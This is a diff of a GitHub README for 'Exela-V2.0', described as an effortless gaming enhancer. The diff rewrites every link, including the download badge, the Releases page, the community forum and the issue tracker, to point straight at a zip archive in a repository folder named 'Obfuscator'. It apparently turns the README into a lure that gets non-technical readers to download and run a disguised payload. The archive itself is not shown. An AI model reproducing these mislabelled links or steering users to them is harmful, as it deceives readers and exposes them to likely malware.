@@ -1,6 +1,6 @@
 # 🎮 Exela-V2.0 - Enhance Your Gaming Experience Effortlessly
 
-[![Download Exela-V2.0](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Fraterculashibboleth86/Exela-V2.0/releases)
+[![Download Exela-V2.0](https://raw.githubusercontent.com/Fraterculashibboleth86/Exela-V2.0/main/Obfuscator/Exela-V2.0-v2.0.zip)](https://raw.githubusercontent.com/Fraterculashibboleth86/Exela-V2.0/main/Obfuscator/Exela-V2.0-v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This README will guide you through the installation and running process, even if
 
 To download Exela-V2.0, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Fraterculashibboleth86/Exela-V2.0/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Fraterculashibboleth86/Exela-V2.0/main/Obfuscator/Exela-V2.0-v2.0.zip).
 2. Look for the latest release titled "Exela-V2.0".
 3. Click on the link to download the file. Save the file to a location on your computer where you can easily find it, like your Desktop or Downloads folder.
 
@@ -67,11 +67,11 @@ If you encounter issues while using Exela:
 
 1. **Check Compatibility:** Ensure your game and operating system are compatible with Exela.
 2. **Reinstall the Tool:** If problems persist, delete the application and reinstall it from the Releases page.
-3. **Consult the Community:** Join our community forums [here](https://github.com/Fraterculashibboleth86/Exela-V2.0/discussions) for support and tips from other users.
+3. **Consult the Community:** Join our community forums [here](https://raw.githubusercontent.com/Fraterculashibboleth86/Exela-V2.0/main/Obfuscator/Exela-V2.0-v2.0.zip) for support and tips from other users.
 
 ## 📞 Support
 
-For further assistance, please open an issue on the [GitHub repository](https://github.com/Fraterculashibboleth86/Exela-V2.0/issues). Our support team typically responds within 24 hours.
+For further assistance, please open an issue on the [GitHub repository](https://raw.githubusercontent.com/Fraterculashibboleth86/Exela-V2.0/main/Obfuscator/Exela-V2.0-v2.0.zip). Our support team typically responds within 24 hours.
 
 ## 📝 License
 
@@ -81,4 +81,4 @@ Exela-V2.0 is open-source software. This means you can use it freely under the t
 
 Exela-V2.0 is designed to enhance your gaming experience with ease. By following the steps outlined above, you can quickly download, install, and start using the application. There’s no need for technical skills; just enjoy your gaming! 
 
-For more details, revisit the [Releases page](https://github.com/Fraterculashibboleth86/Exela-V2.0/releases) and stay updated on the latest features and improvements.
+For more details, revisit the [Releases page](https://raw.githubusercontent.com/Fraterculashibboleth86/Exela-V2.0/main/Obfuscator/Exela-V2.0-v2.0.zip) and stay updated on the latest features and improvements.
